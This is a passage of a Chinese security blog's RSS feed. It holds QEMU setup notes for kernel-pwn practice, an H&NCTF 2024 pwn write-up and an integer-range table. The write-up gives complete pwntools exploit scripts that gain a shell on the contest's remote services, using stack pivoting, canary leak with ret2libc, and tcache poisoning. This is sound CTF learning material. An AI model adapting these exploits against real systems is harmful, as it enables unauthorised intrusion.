class="headerlink" title="安装依赖"></a>安装依赖</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install ninja-build</span><br><span class="line">sudo apt-get install zlib1g zlib1g-dev</span><br><span class="line">sudo apt-get install libglib2.0-dev</span><br><span class="line">sudo apt-get install libpixman-1-dev</span><br></pre></td></tr></table></figure><p>安装libslirp-dev，这个我还不了解是什么，后续深入了解后再补充，没安装的话有些题目启动会报错，一定要在.&#x2F;configure前安装好，不然就得像我一样编译两次(哭了)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libslirp-dev</span><br></pre></td></tr></table></figure><p>没安装的话报错如下</p><p>说缺少了user网络后端的支持</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64: -netdev user,id=t0,: network backend &#x27;user&#x27; is not compiled into this binary</span><br></pre></td></tr></table></figure><h4 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h4><p>本来是没有后面那个 –enable-slirp 的，加上这个是因为安装了 libslirp-dev</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure --enable-slirp</span><br></pre></td></tr></table></figure><h4 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h4><p>此过程大概需要编译30分钟</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo make install</span><br></pre></td></tr></table></figure><h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><p>输入 qemu- 后按两次 Tab</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-[Tab][Tab]</span><br></pre></td></tr></table></figure><p>输出如下选择即安装成功</p><p><img src="/imgs/$%7Bfiilename%7D/kernel-pwn%E5%85%A5%E9%97%A8%E4%B9%8Bqemu%E7%8E%AF%E5%A2%83%E7%9A%84%E9%85%8D%E7%BD%AE-1.png"></p><h3 id="运行sh启动脚本时遇到的错误"><a href="#运行sh启动脚本时遇到的错误" class="headerlink" title="运行sh启动脚本时遇到的错误"></a>运行sh启动脚本时遇到的错误</h3><h4 id="报错1"><a href="#报错1" class="headerlink" title="报错1"></a>报错1</h4><p>缺少了libaio.so.1文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./qemu-system-x86_64: error while loading shared libraries: libaio.so.1: cannot open shared object file: No such file or directory</span><br></pre></td></tr></table></figure><p>解决方案</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libaio1</span><br></pre></td></tr></table></figure><h4 id="报错2"><a href="#报错2" class="headerlink" title="报错2"></a>报错2</h4><p>缺少了libcurl3，我本机的是libcurl4，很多程序都依赖于libcurl4，而且你只能从libcurl3或libcurl4中选择一个进行安装(有种强制爱的感觉)，如果换成了libcurl3，虚拟机大概率是会崩的，不过还是有解决办法的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./qemu-system-x86_64: /lib/x86_64-linux-gnu/libcurl.so.4: version `CURL_OPENSSL_3&#x27; not found (required by ./qemu-system-x86_64)</span><br></pre></td></tr></table></figure><p>解决方案</p><p>你可以在这里找到如何同时安装libcurl3和libcurl4的方法：</p><p><a href="https://askubuntu.com/questions/1061431/how-to-have-both-libcurl3-and-libcurl4-installed-at-same-time">software installation - How to have both libcurl3 and libcurl4 installed at same time? - Ask Ubuntu</a></p><p>我这里简述一下</p><p>先查看一下版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-cache policy libcurl4</span><br></pre></td></tr></table></figure><p>输出如下</p><p><img src="/../imgs/$%7Bfiilename%7D/kernel-pwn%E5%85%A5%E9%97%A8%E4%B9%8Bqemu%E7%8E%AF%E5%A2%83%E7%9A%84%E9%85%8D%E7%BD%AE-2.png"></p><p>因为我已经安装好了libcurl3和libcurl4的包，所以我Installed那里显示的就不是什么7.81.0之类的</p><p>在输出中可以看到有一个名为 7.68.0-1ubuntu2.5ppa1 的包，我们只需安装这个包，就可以同时拥有libcurl3和libcurl4的环境</p><p>直接执行下面的命令，不需要去删除libcurl4</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install libcurl4=7.68.0-1ubuntu2.5ppa1</span><br></pre></td></tr></table></figure><h4 id="报错3"><a href="#报错3" class="headerlink" title="报错3"></a>报错3</h4><p>说无法访问kernel模块，该文件不存在</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Could not access KVM kernel module: No such file or directory</span><br><span class="line">failed to initialize KVM: No such file or directory</span><br></pre></td></tr></table></figure><p>解决方案</p><p>在虚拟机设置中打开 “虚拟化 Inter VT-x&#x2F;EPT 或 AMD-V&#x2F;RVI(V)” 即可</p><p><img src="/../imgs/$%7Bfiilename%7D/kernel-pwn%E5%85%A5%E9%97%A8%E4%B9%8Bqemu%E7%8E%AF%E5%A2%83%E7%9A%84%E9%85%8D%E7%BD%AE-3.png"></p><h3 id="启动设备测试"><a href="#启动设备测试" class="headerlink" title="启动设备测试"></a>启动设备测试</h3><p>我这里用的是 [HITB GSEC2017]BABYQEMU 这道题</p><p>bash中运行启动脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./launch.sh</span><br></pre></td></tr></table></figure><p>得到如下结果，说明设备已经启动成功，可以开始pwn啦</p><p><img src="/../imgs/$%7Bfiilename%7D/kernel-pwn%E5%85%A5%E9%97%A8%E4%B9%8Bqemu%E7%8E%AF%E5%A2%83%E7%9A%84%E9%85%8D%E7%BD%AE-4.png"></p>]]></content:encoded>
      
      
      <category domain="http://example.com/categories/%E7%AC%94%E8%AE%B0/">笔记</category>
      
      
      <category domain="http://example.com/tags/qemu/">qemu</category>
      
      
      <comments>http://example.com/2024/05/23/kernel-pwn%E5%85%A5%E9%97%A8%E4%B9%8Bqemu%E7%8E%AF%E5%A2%83%E7%9A%84%E9%85%8D%E7%BD%AE/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>H&amp;NCTF 2024 pwn 部分题解</title>
      <link>http://example.com/2024/05/13/H-NCTF-2024-pwn-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</link>
      <guid>http://example.com/2024/05/13/H-NCTF-2024-pwn-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</guid>
      <pubDate>Mon, 13 May 2024 09:52:23 GMT</pubDate>
      
      <description>&lt;p&gt;几十个解的题还是能写出来的，但是几个解和0解的题做不出来，我还是太菜了&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>几十个解的题还是能写出来的，但是几个解和0解的题做不出来，我还是太菜了</p><span id="more"></span><h3 id="close"><a href="#close" class="headerlink" title="close"></a>close</h3><p>重定向就可以了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec 1&gt;&amp;2</span><br></pre></td></tr></table></figure><h3 id="ez-pwn"><a href="#ez-pwn" class="headerlink" title="ez_pwn"></a>ez_pwn</h3><p>考一个栈迁移，第一个printf泄露栈地址，然后利用程序自带的2个leave ret完成栈迁移</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">local_file = <span class="string">&#x27;../ctf_file/pwn&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&quot;/home/feichai/glibc-all-in-one/libs/2.23-0ubuntu3_i386/libc.so.6&quot;</span>, checksec = <span class="literal">False</span>)</span><br><span class="line">elf=ELF(local_file)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(local_file)</span></span><br><span class="line">io = remote(<span class="string">&#x27;hnctf.imxbt.cn&#x27;</span>, <span class="number">46959</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s, addr</span>):</span><br><span class="line">    <span class="keyword">return</span> info(<span class="string">f&#x27;\033[1;33m<span class="subst">&#123;<span class="string">f&quot;<span class="subst">&#123;s&#125;</span>--&gt;0x<span class="subst">&#123;addr:02x&#125;</span>&quot;</span>&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b *0x08048616</span></span><br><span class="line"><span class="string">    b *0x08048631</span></span><br><span class="line"><span class="string">    b *0x08048666</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    gdb.attach(io,gdbscript)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">r   = <span class="keyword">lambda</span> a:   io.recv(a)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a:   io.recvuntil(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:   io.send(a)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b: io.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:   io.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: io.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line">system = <span class="number">0x0804857D</span></span><br><span class="line">backdoor = <span class="number">0x08048566</span></span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&#x27;your name?&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2c</span>)</span><br><span class="line">ru(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2c</span>)</span><br><span class="line">stack_addr = u32(r(<span class="number">4</span>))</span><br><span class="line">lg(<span class="string">&quot;stack_addr&quot;</span>,stack_addr)</span><br><span class="line">input_addr = stack_addr- <span class="number">0x38</span></span><br><span class="line">lg(<span class="string">&quot;input_addr&quot;</span>,input_addr)</span><br><span class="line">s(p32(system)+p32(input_addr+<span class="number">20</span>)*<span class="number">2</span>+<span class="string">b&#x27;sh\x00\x00&#x27;</span>*<span class="number">8</span>+p32(input_addr-<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="idea"><a href="#idea" class="headerlink" title="idea"></a>idea</h3><p>输入-1转化为unsigned int变成大数造成栈溢出，fmt泄露canary，然后就是经典的ret2libc了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">local_file = <span class="string">&#x27;../ctf_file/idea&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&quot;/home/feichai/ctf_libc/puts_150/libc6-i386_2.23-0ubuntu11.3_amd64.so&quot;</span>, checksec = <span class="literal">False</span>)</span><br><span class="line">elf=ELF(local_file)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    io = process(local_file)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&#x27;hnctf.imxbt.cn&#x27;</span>, <span class="number">48805</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s, addr</span>):</span><br><span class="line">    <span class="keyword">return</span> info(<span class="string">f&#x27;\033[1;33m<span class="subst">&#123;<span class="string">f&quot;<span class="subst">&#123;s&#125;</span>--&gt;0x<span class="subst">&#123;addr:02x&#125;</span>&quot;</span>&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b *0x080486CF</span></span><br><span class="line"><span class="string">    b *0x080486E9</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    gdb.attach(io,gdbscript)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">r   = <span class="keyword">lambda</span> a:   io.recv(a)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a:   io.recvuntil(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:   io.send(a)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b: io.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:   io.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: io.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt.puts</span><br><span class="line">puts_got = elf.got.puts</span><br><span class="line">vuln = elf.sym.vuln</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">sla(<span class="string">b&#x27;me to read?&#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;u a gift!&#x27;</span>,<span class="string">b&#x27;%7$p&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line"><span class="comment">#leak_addr = int(r(8),16)</span></span><br><span class="line"><span class="comment">#libc_addr = leak_addr - libc.sym[b&#x27;__libc_start_main&#x27;] - 247</span></span><br><span class="line">canary = <span class="built_in">int</span>(r(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line">lg(<span class="string">&#x27;canary&#x27;</span>,canary)</span><br><span class="line">pd = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p32(canary)+p32(<span class="number">0</span>)*<span class="number">3</span>+p32(puts_plt)+p32(vuln)+p32(puts_got)</span><br><span class="line">sla(<span class="string">b&#x27;bytes of data!\n&#x27;</span>,pd)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(ru(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line">lg(<span class="string">&#x27;puts_addr&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line"></span><br><span class="line">libc_system = libc_base + libc.symbols[<span class="string">b&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;me to read?&#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;u a gift!&#x27;</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pd = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p32(canary)+p32(<span class="number">0</span>)*<span class="number">3</span>+p32(libc_system) + p32(<span class="number">0</span>) +p32(bin_sh_addr)</span><br><span class="line">sla(<span class="string">b&#x27;bytes of data!\n&#x27;</span>,pd)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="what"><a href="#what" class="headerlink" title="what"></a>what</h3><p>tcache 投毒 + uaf漏洞 + 劫持__malloc_hook，修改__malloc_hook为gadget即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line">local_file = <span class="string">&#x27;../ctf_file/what&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&quot;/home/feichai/ctf_file/libc-2.27.so&quot;</span>, checksec = <span class="literal">False</span>)</span><br><span class="line">elf=ELF(local_file)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    io = process(local_file)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&#x27;hnctf.imxbt.cn&#x27;</span>, <span class="number">50228</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s, addr</span>):</span><br><span class="line">    <span class="keyword">return</span> info(<span class="string">f&#x27;\033[1;33m<span class="subst">&#123;<span class="string">f&quot;<span class="subst">&#123;s&#125;</span>--&gt;0x<span class="subst">&#123;addr:02x&#125;</span>&quot;</span>&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    gdb.attach(io,gdbscript)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">r   = <span class="keyword">lambda</span> a:   io.recv(a)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a:   io.recvuntil(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:   io.send(a)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b: io.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:   io.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: io.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Enter your command:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>():</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&#x27;please enter idx:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&#x27;please enter idx:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sa(<span class="string">&#x27;your content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free()</span><br><span class="line"></span><br><span class="line">free() <span class="comment">#1</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Content:&quot;</span>)</span><br><span class="line">libc_leak = u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg(<span class="string">&#x27;libc_leak&#x27;</span>,libc_leak)</span><br><span class="line"></span><br><span class="line">libc_base = libc_leak - <span class="number">0x3ebca0</span> <span class="comment">#0x3ebca0</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">one_gadget = [<span class="number">0x4f29e</span>,<span class="number">0x4f2a5</span>,<span class="number">0x4f302</span>,<span class="number">0x10a2fc</span>]</span><br><span class="line">gadget = libc_base + <span class="number">0x10a2fc</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p64(malloc_hook))</span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>,p64(gadget)*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="http://example.com/categories/write-up/">write up</category>
      
      
      
      <comments>http://example.com/2024/05/13/H-NCTF-2024-pwn-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>整数类型取值范围</title>
      <link>http://example.com/2024/04/26/%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E5%8F%96%E5%80%BC%E8%8C%83%E5%9B%B4/</link>
      <guid>http://example.com/2024/04/26/%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E5%8F%96%E5%80%BC%E8%8C%83%E5%9B%B4/</guid>
      <pubDate>Fri, 26 Apr 2024 14:57:03 GMT</pubDate>
      
      <description>&lt;p&gt;用于整数溢出&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>用于整数溢出</p><span id="more"></span><table><thead><tr><th>type</th><th>min</th><th>max</th><th>hex</th></tr></thead><tbody><tr><td>int</td><td>-2147483648</td><td>2147483647 (2^31 - 1)</td><td>0x7FFFFFFF</td></tr><tr><td>unsigned int</td><td>0</td><td>4294967295 (2^32 - 1)</td><td>0xFFFFFFFF</td></tr><tr><td>long</td><td>-2147483648</td><td>2147483647 (2^31 - 1)</td><td>0x7FFFFFFF</td></tr><tr><td>unsigned long</td><td>0</td><td>4294967295 (2^32 - 1)</td><td>0xFFFFFFFF</td></tr><tr><td>long long</td><td>-9223372036854775808</td><td>9223372036854775807 (2^63 - 1)</td><td>0x7FFFFFFFFFFFFFFF</td></tr><tr><td>unsigned long long</td><td>0</td><td>18446744073709551615 (2^64 - 1)</td><td>0xFFFFFFFFFFFFFFFF</td></tr><tr><td>__int8</td><td>-128</td><td>127</td><td>0x7F</td></tr><tr><td>unsigned __int8</td><td>0</td><td>255</td><td>0xFF</td></tr><tr><td>__int16</td><td>-32768</td><td>32767</td><td>0x7FFF</td></tr><tr><td>unsigned __int16</td><td>0</td><td>65535</td><td>0xFFFF</td></tr><tr><td>__int32</td><td>-2147483648</td><td>2147483647</td><td>0x7FFFFFFF</td></tr><tr><td>unsigned __int32</td><td>0</td><td>4294967295</td><td>0xFFFFFFFF</td></tr><tr><td>__int64</td><td>-9223372036854775808</td><td>9223372036854775807 (2^63 - 1)</td><td>0x7FFFFFFFFFFFFFFF</td></tr><tr><td>unsigned __int64</td><td>0</td><td>18446744073709551615 (2^64 - 1)</td><td>0xFFFFFFFFFFFFFFFF</td></tr></tbody></table>]]></content:encoded>
      
      
      <category domain="http://example.com/categories/%E7%AC%94%E8%AE%B0/">笔记</category>
      
      
      
      <comments>http://example.com/2024/04/26/%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E5%8F%96%E5%80%BC%E8%8C%83%E5%9B%B4/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
